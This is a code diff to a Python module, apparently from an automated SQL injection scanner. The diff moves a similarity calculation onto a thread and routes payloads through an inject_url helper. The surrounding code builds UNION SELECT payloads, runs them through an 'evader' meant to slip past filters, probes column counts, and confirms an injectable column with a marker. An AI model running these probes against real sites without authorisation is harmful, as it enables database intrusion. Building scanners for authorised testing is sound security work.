@@ -1,4 +1,5 @@
 import logging
+import asyncio
 import difflib
 from typing import Dict, Any, List, Optional
 from backend.core.vector_base import BaseVector
@@ -36,7 +37,7 @@ class VectorUnion(BaseVector):
         for i in range(1, self.MAX_COLUMNS + 1):
             nulls = ",".join(["NULL"] * i)
             payload = evader.evade(f" UNION SELECT {nulls}-- ")
-            test_url = f"{self.target_url}{payload}"
+            test_url = self.inject_url(payload)
             
             resp = await self._safe_get(test_url)
             if not resp:
@@ -44,7 +45,11 @@ class VectorUnion(BaseVector):
                 
             # Si el código de estado es 200 y el ratio de similaridad es alto,
             # o si el error de sintaxis desaparece comparado con un payload erróneo:
-            ratio = difflib.SequenceMatcher(None, base_content, resp.text).ratio()
+            # Offload heavy CPU-bound ratio calculation to a separate thread
+            def calculate_ratio():
+                return difflib.SequenceMatcher(None, base_content, resp.text).ratio()
+            
+            ratio = await asyncio.to_thread(calculate_ratio)
             
             if resp.status_code == 200 and ratio > 0.80:
                 # 3. Confirmación: Inyectar un marcador único
@@ -54,7 +59,7 @@ class VectorUnion(BaseVector):
                     vals = ["NULL"] * i
                     vals[col_idx] = f"'{marker}'"
                     confirm_payload = evader.evade(f" UNION SELECT {','.join(vals)}-- ")
-                    confirm_url = f"{self.target_url}{confirm_payload}"
+                    confirm_url = self.inject_url(confirm_payload)
                     
                     confirm_resp = await self._safe_get(confirm_url)
                     if confirm_resp and marker in confirm_resp.text:
